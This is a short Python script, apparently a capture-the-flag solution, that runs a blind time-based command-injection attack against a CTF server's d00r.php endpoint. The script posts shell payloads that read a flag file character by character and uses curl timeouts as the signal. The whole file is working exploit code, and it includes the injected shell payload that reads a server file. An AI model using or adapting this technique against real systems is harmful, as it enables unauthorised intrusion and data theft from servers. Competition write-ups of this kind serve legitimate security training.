import subprocess
import string
import sys
import random


CAND = string.ascii_letters + string.digits + string.punctuation

candidates = list(CAND)
ans = []
i = 0

while True:
    print(''.join(ans))

    random.shuffle(candidates)
    for c in candidates:
        payload = (
            '%23=x="$(cat /flag_is_here)"; if [ ${x:' + str(i) + ':1} = $\'' + c + '\' ]; then sleep 3; fi')

        args = [
            'curl',
            '-x',
            'socks5h://localhost:8888',
            'http://edu-ctf.csie.org:10151/d00r.php?87=%01HU%11',
            '--data',
            payload]

        try:
            subp = subprocess.run(
                args,
                timeout=1,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT)
        except subprocess.TimeoutExpired as err:
            ans.append(c)
            i += 1
            break
    else:
        ans.append('???')
        i += 1

print(ans)
